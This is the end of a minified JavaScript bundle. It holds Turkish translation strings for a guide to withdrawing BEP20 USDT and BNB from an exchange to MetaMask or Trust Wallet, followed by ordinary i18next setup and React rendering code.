            step2Content: "BEP20 (Binance Smart Chain) çekmeleri, gas ücretlerini ödemek için cüzdanınızda küçük miktarda BNB gerektirir. Bazı borsalar çekmenizden otomatik olarak BNB keser, ancak çoğu sadece USDT gönderir—gelecekteki işlemler için manuel olarak biraz BNB göndermeniz gerekecek.",
            step2Action: 'Yapılacaklar: ~$1 değerinde BNB satın alın (0.002 BNB genellikle birçok transfer için yeterlidir). Yukarıdaki gibi: "Trade"/"Convert"e gidin, USDT ile BNB satın alın.',
            step3Title: "3. USDT (BEP20)'yi Trust Wallet/MetaMask'a Çekin",
            step3Content: `Borsanızda "Wallet" veya "Assets"e gidin. USDT'yi bulun, "Withdraw" veya "Send"e tıklayın.`,
            step3Network: 'Ağ Seçimi: Çekme ağı olarak "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" seçin.',
            step3Warning: "⚠️ BSC/BEP20 kullanmak istiyorsanız ERC20 veya TRC20 seçmeyin.",
            step3Address: `Cüzdan Adresinizi Girin: Trust Wallet veya MetaMask'ı açın. "Smart Chain" (BSC için) seçin veya henüz eklemediyseniz MetaMask'a BSC ekleyin. BEP20 adresinizi kopyalayın (0x... ile başlayacak). Adresi borsa çekme formuna yapıştırın. Çekme miktarını girin (çekme ücretleri için küçük miktar bırakın, borsada gösterilir). Herhangi bir 2FA/Güvenlik kontrolünü tamamlayın. Çekmeyi onaylayın.`,
            step4Title: "4. BNB Çekin (Gas Ücretleri İçin)",
            step4Content: "BNB ile çekme işlemini tekrarlayın: BNB'yi aynı adrese çekin (MetaMask/Trust Wallet'ınız). Sadece küçük miktara ihtiyacınız var (örn. 0.002 BNB).",
            step5Title: "5. Onay Bekleyin",
            step5Content: `Çoğu BEP20 çekme 2-10 dakika içinde işlenir. "Smart Chain"/BSC ağı altında USDT ve BNB bakiyeleri için Trust Wallet/MetaMask'ınızı kontrol edin.`,
            step6Title: "6. (Cüzdanınızda Sadece USDT Varsa ve BNB Yoksa)",
            step6Content: "Gelecekteki işlemleri (gönderme, takas, vb.) ödemek için cüzdanınızda biraz BNB olması GEREKİR. Unuttuysanız, yapabilecekleriniz: Borsada BNB satın alın ve cüzdanınıza gönderin. Bir arkadaşınızdan size küçük miktarda BNB göndermesini isteyin. Cüzdanınızda 0 BNB ile BEP20 token'larını taşımaya/takas etmeye asla çalışmayın – işlem başarısız olur.",
            sampleFlowTitle: "Örnek Akış – Binance'den MetaMask'a (BEP20 USDT)",
            sampleStep1: "Diğer token'ınızı USDT karşılığında satın.",
            sampleStep2: "$1 değerinde BNB satın alın.",
            sampleStep3: "USDT (BEP20)'yi MetaMask BSC adresinize çekin.",
            sampleStep4: "BNB (BEP20)'yi aynı adrese çekin.",
            sampleStep5: "İkisinin de gelmesini bekleyin.",
            proTipsTitle: "Pro İpuçları",
            proTip1: 'Ağı her zaman iki kez kontrol edin: BEP20 için ağ "Binance Smart Chain"dir (ERC20 değil, TRC20 değil).',
            proTip2: "Çekme işlemini onaylamak için önce küçük miktarla (örn. $5) test edin.",
            proTip3: "Asla yanlış ağa para göndermeyin—desteklenmeyen ağ adreslerine gönderirseniz varlıklar kaybolabilir.",
            proTip4: "Takılırsanız, gerçek zamanlı durum için borsa çekme geçmişinizi ve cüzdanınızın BSCscan.com girişini (adrese göre arama) kontrol edin."
        }
    }
};
be.use(wm).use(If).init({
    resources: Px,
    fallbackLng: "en",
    debug: !1,
    interpolation: {
        escapeValue: !1
    },
    detection: {
        order: ["localStorage", "navigator", "htmlTag"],
        caches: ["localStorage"]
    }
});
sm(document.getElementById("root")).render(a.jsx(E.StrictMode, {
    children: a.jsx(qf, {})
}));

